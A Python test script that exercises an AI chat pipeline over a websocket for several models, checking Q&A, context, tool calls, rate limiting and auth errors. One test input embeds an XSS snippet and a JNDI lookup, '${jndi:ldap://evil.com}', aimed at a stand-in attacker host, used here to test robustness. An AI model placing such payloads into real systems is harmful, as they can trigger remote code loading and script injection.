#!/usr/bin/env python
"""Automated test script for AICodex chat pipeline using debug_chat_cli logic."""

import argparse
import asyncio
import json
import os
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

import httpx
import websockets
from dotenv import load_dotenv

REPO_ROOT = Path(__file__).resolve().parent.parent
load_dotenv(dotenv_path=Path(__file__).resolve().parent / ".env.debug")


@dataclass
class PipelineResult:
    model: str
    test: str
    passed: bool
    ttft: Optional[float] = None
    rtt: Optional[float] = None
    error_msg: Optional[str] = None
    details: str = ""


@dataclass
class SessionState:
    provider: str
    model: str
    api_key: Optional[str]
    base_url: Optional[str]
    conversation_id: Optional[int]
    failure_log_path: Path
    last_send_time: Optional[float] = None
    last_user_message: str = ""
    seen_first_token: bool = False
    connection_closed: asyncio.Event = field(default_factory=asyncio.Event)
    turn_complete: asyncio.Event = field(default_factory=asyncio.Event)
    close_requested: bool = False
    response_started: bool = False
    received_events: list = field(default_factory=list)
    ttft: Optional[float] = None
    rtt: Optional[float] = None
    error_event: Optional[dict] = None

    def log_failure(self, reason: str) -> None:
        entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "provider": self.provider,
            "model": self.model,
            "conversation_id": self.conversation_id,
            "message": self.last_user_message,
            "reason": reason,
        }
        with self.failure_log_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry) + "\n")


def _default_provider(target: str) -> str:
    configured = os.environ.get("AICODEX_DEBUG_PROVIDER")
    if configured:
        return configured
    return "local" if target == "local" else "ollama_cloud"


def _default_api_key(provider: str) -> Optional[str]:
    if provider == "ollama_cloud":
        return os.environ.get("OLLAMA_CLOUD_API_KEY") or os.environ.get("OLLAMA_CLOUD_APIK")
    return None


def _default_base_url(provider: str) -> Optional[str]:
    if provider == "ollama_cloud":
        return os.environ.get("OLLAMA_CLOUD_BASE_URL") or "https://ollama.com"
    return None


def _to_ws_url(http_url: str) -> str:
    if http_url.startswith("https://"):
        return "wss://" + http_url[len("https://"):]
    if http_url.startswith("http://"):
        return "ws://" + http_url[len("http://"):]
    return http_url


def _resolve_backend_url(target: str, explicit_url: Optional[str], route_map_path: Path) -> str:
    if explicit_url:
        return explicit_url.rstrip("/")
    if target == "local":
        return "http://localhost:8000"
    if not route_map_path.exists():
        raise SystemExit(f"route_map.json not found at {route_map_path}; pass --backend-url explicitly.")
    route_map = json.loads(route_map_path.read_text())
    key = "premium_url" if target == "premium" else "backend_url"
    url = route_map.get(key)
    if not url:
        raise SystemExit(f"route_map.json has no '{key}' entry; pass --backend-url explicitly.")
    return url.rstrip("/")


async def login(backend_url: str, username: str, password: str) -> str:
    async with httpx.AsyncClient(timeout=15.0) as client:
        resp = await client.post(
            f"{backend_url}/api/auth/login",
            data={"username": username, "password": password},
        )
        resp.raise_for_status()
        return resp.json()["access_token"]


async def list_models(
    backend_url: str,
    token: str,
    provider: str,
    base_url: Optional[str],
    api_key: Optional[str] = None,
) -> list[dict]:
    headers = {"Authorization": f"Bearer {token}"}
    if base_url:
        headers["X-Base-Url"] = base_url
    if api_key:
        headers["X-API-Key"] = api_key
    async with httpx.AsyncClient(timeout=15.0) as client:
        resp = await client.get(f"{backend_url}/api/models", params={"provider": provider}, headers=headers)
        resp.raise_for_status()
        return resp.json()


async def create_conversation(backend_url: str, token: str) -> int:
    headers = {"Authorization": f"Bearer {token}"}
    async with httpx.AsyncClient(timeout=15.0) as client:
        resp = await client.post(
            f"{backend_url}/api/conversations/",
            json={"title": "Debug CLI Conversation"},
            headers=headers,
        )
        resp.raise_for_status()
        return int(resp.json()["id"])


async def receiver(ws, session: SessionState) -> None:
    try:
        async for raw in ws:
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                print(f"\n[raw non-JSON frame] {raw!r}")
                continue
            session.received_events.append(data)
            etype = data.get("type", "?")
            if etype in ("token", "token_delta"):
                if not session.seen_first_token and session.last_send_time is not None:
                    session.ttft = time.monotonic() - session.last_send_time
                    session.seen_first_token = True
            elif etype == "error":
                session.error_event = data
                session.turn_complete.set()
            elif etype == "done":
                session.rtt = time.monotonic() - session.last_send_time if session.last_send_time else None
                session.seen_first_token = False
                session.response_started = False
                session.turn_complete.set()
    except websockets.ConnectionClosed as e:
        print(f"\n[connection closed by server] {e}")
        session.connection_closed.set()
        session.turn_complete.set()
        if not session.close_requested:
            session.log_failure(f"WebSocket connection closed unexpectedly: {e}")


async def send_message(ws, session: SessionState, message: str, wait_complete: bool = True) -> PipelineResult:
    if session.connection_closed.is_set():
        return PipelineResult(session.model, "send", False, error_msg="Connection closed")

    session.last_user_message = message
    session.seen_first_token = False
    session.response_started = False
    session.turn_complete.clear()
    session.received_events = []
    session.ttft = None
    session.rtt = None
    session.error_event = None

    payload = {
        "conversation_id": session.conversation_id,
        "message": message,
        "provider": session.provider,
        "model": session.model,
        "api_key": session.api_key,
        "api_keys": {session.provider: session.api_key} if session.api_key else {},
        "base_url": session.base_url,
        "agent_mode": True,
        "local_backend_mode": "ollama",
        "client_type": "web",
    }
    session.last_send_time = time.monotonic()
    try:
        await ws.send(json.dumps(payload))
    except websockets.ConnectionClosed as e:
        session.log_failure(f"Failed to send message: {e}")
        return PipelineResult(session.model, "send", False, error_msg=str(e))

    if wait_complete:
        try:
            await asyncio.wait_for(session.turn_complete.wait(), timeout=180.0)
        except asyncio.TimeoutError:
            return PipelineResult(session.model, "timeout", False, error_msg="Timeout waiting for response")
        except Exception as e:
            if session.connection_closed.is_set():
                return PipelineResult(session.model, "send", False, error_msg="Connection closed during wait")
            raise

    # Analyze results
    has_error = session.error_event is not None
    has_done = any(e.get("type") == "done" for e in session.received_events)
    has_tokens = any(e.get("type") in ("token", "token_delta") for e in session.received_events)
    has_tool_call = any(e.get("type") == "tool_call" for e in session.received_events)
    has_tool_result = any(e.get("type") == "tool_result" for e in session.received_events)

    error_msg = session.error_event.get("message") if session.error_event else None

    return PipelineResult(
        model=session.model,
        test="send",
        passed=not has_error and has_done,
        ttft=session.ttft,
        rtt=session.rtt,
        error_msg=error_msg,
        details=f"tokens={has_tokens}, done={has_done}, tool_call={has_tool_call}, tool_result={has_tool_result}, error={has_error}"
    )


async def run_test_matrix(backend_url: str, token: str, provider: str, base_url: str, api_key: str,
                          model: str, conversation_id: int, failure_log: Path) -> list[PipelineResult]:
    ws_base = _to_ws_url(backend_url)
    ws_url = f"{ws_base}/api/chat/ws/agent?token={token}"

    session = SessionState(
        provider=provider,
        model=model,
        api_key=api_key,
        base_url=base_url,
        conversation_id=conversation_id,
        failure_log_path=failure_log,
    )

    results = []

    async with websockets.connect(ws_url, max_size=None) as ws:
        recv_task = asyncio.create_task(receiver(ws, session))

        # Wait a moment for connection to settle
        await asyncio.sleep(0.5)

        print(f"\n{'='*60}")
        print(f"Testing model: {model}")
        print(f"{'='*60}")

        async def use_fresh_conversation() -> None:
            session.conversation_id = await create_conversation(backend_url, token)
            await asyncio.sleep(1.7)

        def print_result(result: PipelineResult):
            ttft_str = f"{result.ttft:.2f}s" if result.ttft else "N/A"
            rtt_str = f"{result.rtt:.2f}s" if result.rtt else "N/A"
            status = "PASS" if result.passed else "FAIL"
            print(f"  {result.test}: {status} | TTFT={ttft_str} RTT={rtt_str}")
            if result.error_msg:
                print(f"       Error: {result.error_msg}")
            if result.details:
                print(f"       Details: {result.details}")

        # Test A: Basic single-turn Q&A
        print(f"\n[A] Basic Q&A...")
        result = await send_message(ws, session, "What is the capital of France?")
        result.test = "A"
        result.passed = result.passed and result.ttft is not None
        results.append(result)
        print_result(result)
        await use_fresh_conversation()

        # Test B: Multi-turn context retention
        print(f"\n[B] Multi-turn context...")
        await send_message(ws, session, "My favorite color is teal. Remember this.")
        await asyncio.sleep(1.7)
        result = await send_message(ws, session, "What did I just say my favorite color was?")
        result.test = "B"
        response_text = " ".join(
            e.get("delta", "") + e.get("content", "") for e in session.received_events if e.get("type") in ("token", "token_delta")
        ).lower()
        result.passed = result.passed and "teal" in response_text
        results.append(result)
        print_result(result)
        if "teal" not in response_text:
            print(f"       Response text: {response_text[:200]}")
        await use_fresh_conversation()

        # Test C: Tool-calling (ask about files/workspace)
        print(f"\n[C] Tool-calling...")
        result = await send_message(ws, session, "List the files in the current workspace directory.")
        result.test = "C"
        has_tool_call = any(e.get("type") == "tool_call" for e in session.received_events)
        has_tool_result = any(e.get("type") == "tool_result" for e in session.received_events)
        result.passed = result.passed and has_tool_call and has_tool_result
        results.append(result)
        print_result(result)
        if not has_tool_call:
            print(f"       WARNING: No tool_call event received")
        await use_fresh_conversation()

        # Test D: Long input
        print(f"\n[D] Long input...")
        long_text = "Paragraph 1: " + "This is a test paragraph. " * 50 + "\n\n" + \
                    "Paragraph 2: " + "Another test paragraph with different content. " * 50 + "\n\n" + \
                    "Paragraph 3: " + "Final paragraph to make this sufficiently long. " * 50
        result = await send_message(ws, session, f"Summarize this text in one sentence:\n\n{long_text}")
        result.test = "D"
        result.passed = result.passed and result.ttft is not None
        results.append(result)
        print_result(result)
        await use_fresh_conversation()

        # Test E: Special characters / injection-shaped input
        print(f"\n[E] Special characters...")
        special_input = '''```python
def test():
    return "hello 'world' \\"quote\\""
```
Unicode: 🎉🚀💻 αβγ 中文 العربية
Quotes: "double" 'single' `backtick`
Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
        result = await send_message(ws, session, f"Echo this back to me:\n{special_input}")
        result.test = "E"
        result.passed = result.passed and result.ttft is not None
        results.append(result)
        print_result(result)
        await use_fresh_conversation()

        # Test F: Empty/garbage input
        print(f"\n[F] Empty/garbage input...")
        result = await send_message(ws, session, "   ")
        result.test = "F"
        result.passed = result.passed and result.ttft is not None
        results.append(result)
        print_result(result)
        await use_fresh_conversation()

        # Test G: Rapid consecutive messages (send second before first completes)
        print(f"\n[G] Rapid consecutive messages...")
        session.last_user_message = "First rapid message"
        session.seen_first_token = False
        session.response_started = False
        session.turn_complete.clear()
        session.received_events = []
        session.ttft = None
        session.rtt = None
        session.error_event = None

        payload1 = {
            "conversation_id": session.conversation_id,
            "message": "First rapid message - say 'first'",
            "provider": session.provider,
            "model": session.model,
            "api_key": session.api_key,
            "api_keys": {session.provider: session.api_key} if session.api_key else {},
            "base_url": session.base_url,
            "agent_mode": True,
            "local_backend_mode": "ollama",
            "client_type": "web",
        }
        session.last_send_time = time.monotonic()
        try:
            await ws.send(json.dumps(payload1))
        except websockets.ConnectionClosed as e:
            result = PipelineResult(session.model, "G", False, error_msg=f"Connection closed: {e}")
            results.append(result)
            print_result(result)
            recv_task.cancel()
            return results

        # Send second immediately without waiting
        await asyncio.sleep(0.1)

        payload2 = {
            "conversation_id": session.conversation_id,
            "message": "Second rapid message - say 'second'",
            "provider": session.provider,
            "model": session.model,
            "api_key": session.api_key,
            "api_keys": {session.provider: session.api_key} if session.api_key else {},
            "base_url": session.base_url,
            "agent_mode": True,
            "local_backend_mode": "ollama",
            "client_type": "web",
        }
        try:
            await ws.send(json.dumps(payload2))
        except websockets.ConnectionClosed as e:
            result = PipelineResult(session.model, "G", False, error_msg=f"Connection closed: {e}")
            results.append(result)
            print_result(result)
            recv_task.cancel()
            return results

        deadline = time.monotonic() + 180.0
        while time.monotonic() < deadline:
            done_count = sum(1 for e in session.received_events if e.get("type") == "done")
            if done_count >= 1 or session.connection_closed.is_set():
                break
            await asyncio.sleep(0.25)

        # The server's contract is one accepted request plus a structured cooldown error.
        done_count = sum(1 for e in session.received_events if e.get("type") == "done")
        rate_limit_errors = [
            e for e in session.received_events
            if e.get("type") == "error" and e.get("category") == "rate_limit"
        ]
        result = PipelineResult(
            model=session.model,
            test="G",
            passed=done_count >= 1 and len(rate_limit_errors) == 1 and not session.connection_closed.is_set(),
            ttft=session.ttft,
            rtt=session.rtt,
            error_msg=rate_limit_errors[0].get("message") if rate_limit_errors else ("Connection closed" if session.connection_closed.is_set() else None),
            details=f"done_events={done_count}, rate_limit_errors={len(rate_limit_errors)}"
        )
        results.append(result)
        print_result(result)
        if session.connection_closed.is_set():
            print("  WARNING: Connection was closed during test G")
            recv_task.cancel()
            return results
        await use_fresh_conversation()

        # Test H: Deliberate failure - invalid API key
        print(f"\n[H] Invalid API key...")
        old_api_key = session.api_key
        session.api_key = "invalid-key-12345"
        session.api_keys = {session.provider: session.api_key}
        
        session.last_user_message = "Test with invalid key"
        session.seen_first_token = False
        session.response_started = False
        session.turn_complete.clear()
        session.received_events = []
        session.ttft = None
        session.rtt = None
        session.error_event = None

        payload = {
            "conversation_id": session.conversation_id,
            "message": "This should fail with auth error",
            "provider": session.provider,
            "model": session.model,
            "api_key": session.api_key,
            "api_keys": {session.provider: session.api_key},
            "base_url": session.base_url,
            "agent_mode": True,
            "local_backend_mode": "ollama",
            "client_type": "web",
        }
        session.last_send_time = time.monotonic()
        try:
            await ws.send(json.dumps(payload))
        except websockets.ConnectionClosed as e:
            result = PipelineResult(session.model, "H", False, error_msg=f"Connection closed: {e}")
            results.append(result)
            print_result(result)
            session.api_key = old_api_key
            session.api_keys = {session.provider: session.api_key} if session.api_key else {}
            recv_task.cancel()
            return results

        try:
            await asyncio.wait_for(session.turn_complete.wait(), timeout=30.0)
        except asyncio.TimeoutError:
            pass

        has_error = session.error_event is not None
        error_msg = session.error_event.get("message") if session.error_event else None
        is_auth_error = has_error and session.error_event.get("category") == "provider_auth" and session.error_event.get("status_code") == 401
        
        result = PipelineResult(
            model=session.model,
            test="H",
            passed=has_error and is_auth_error,
            ttft=session.ttft,
            rtt=session.rtt,
            error_msg=error_msg,
            details=f"has_error={has_error}, category={session.error_event.get('category') if session.error_event else None}, status_code={session.error_event.get('status_code') if session.error_event else None}"
        )
        results.append(result)
        print_result(result)
        if not is_auth_error and has_error:
            print(f"       WARNING: Error not recognized as auth failure: {error_msg}")

        # Restore valid API key
        session.api_key = old_api_key
        session.api_keys = {session.provider: session.api_key} if session.api_key else {}

        recv_task.cancel()
        try:
            await ws.close()
        except Exception:
            pass

    return results


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", choices=["local", "be", "premium"], default="be")
    parser.add_argument("--backend-url", default=None)
    parser.add_argument("--route-map", default=str(REPO_ROOT / "route_map.json"))
    parser.add_argument("--username", default=os.environ.get("AICODEX_DEBUG_USERNAME"))
    parser.add_argument("--password", default=os.environ.get("AICODEX_DEBUG_PASSWORD"))
    parser.add_argument("--token", default=None)
    parser.add_argument("--provider", default=None)
    parser.add_argument("--model", default=None, help="If not set, tests all 3 target models")
    parser.add_argument("--api-key", default=None)
    parser.add_argument("--base-url", default=None)
    parser.add_argument("--failure-log", default=str(Path(__file__).resolve().parent / "debug_chat_failures.log"))
    args = parser.parse_args()

    backend_url = _resolve_backend_url(args.target, args.backend_url, Path(args.route_map))
    provider = args.provider or _default_provider(args.target)
    api_key = args.api_key or _default_api_key(provider)
    base_url = args.base_url or _default_base_url(provider)

    if args.target != "local":
        print(f"[WARNING] Connecting to the '{args.target}' PRODUCTION deployment: {backend_url}")

    if args.token:
        token = args.token
        print("Using provided token (skipping login).")
    else:
        if not args.username or not args.password:
            raise SystemExit("Provide --username/--password (or AICODEX_DEBUG_USERNAME/AICODEX_DEBUG_PASSWORD), or --token.")
        print(f"Logging in as {args.username} against {backend_url}...")
        token = await login(backend_url, args.username, args.password)
        print("Login OK.")

    # Get available models to confirm
    models = await list_models(backend_url, token, provider, base_url, api_key)
    available = [m.get("id") for m in models if m.get("id")]
    print(f"Available models: {available}")

    target_models = [args.model] if args.model else ["gemma4:31b", "gpt-oss:20b", "nemotron-3-nano:30b"]
    target_models = [m for m in target_models if m in available]
    print(f"Testing models: {target_models}")

    all_results = []

    for model in target_models:
        conversation_id = await create_conversation(backend_url, token)
        print(f"Created conversation {conversation_id} for {model}")

        try:
            results = await run_test_matrix(
                backend_url, token, provider, base_url, api_key,
                model, conversation_id, Path(args.failure_log)
            )
            all_results.extend(results)
        except Exception as e:
            print(f"  ERROR testing {model}: {e}")
            all_results.append(PipelineResult(model, "CONNECTION", False, error_msg=str(e)))

    # Summary
    print(f"\n{'='*60}")
    print("SUMMARY REPORT")
    print(f"{'='*60}")

    for model in target_models:
        model_results = [r for r in all_results if r.model == model]
        print(f"\n--- {model} ---")
        for r in model_results:
            status = "PASS" if r.passed else "FAIL"
            ttft_str = f"{r.ttft:.2f}s" if r.ttft else "N/A"
            rtt_str = f"{r.rtt:.2f}s" if r.rtt else "N/A"
            print(f"  {r.test}: {status} | TTFT={ttft_str} RTT={rtt_str}")
            if r.error_msg:
                print(f"       Error: {r.error_msg}")
            if r.details:
                print(f"       Details: {r.details}")

        # Calculate averages only for successful tests
        ttfts = [r.ttft for r in model_results if r.ttft is not None]
        rtts = [r.rtt for r in model_results if r.rtt is not None]
        if ttfts:
            print(f"  Average TTFT: {sum(ttfts)/len(ttfts):.2f}s")
        if rtts:
            print(f"  Average RTT: {sum(rtts)/len(rtts):.2f}s")

    # Read failure log
    failure_log_path = Path(args.failure_log)
    if failure_log_path.exists():
        print(f"\n--- Failure Log ({failure_log_path}) ---")
        with failure_log_path.open("r") as f:
            for line in f:
                print(line.strip())


if __name__ == "__main__":
    asyncio.run(main())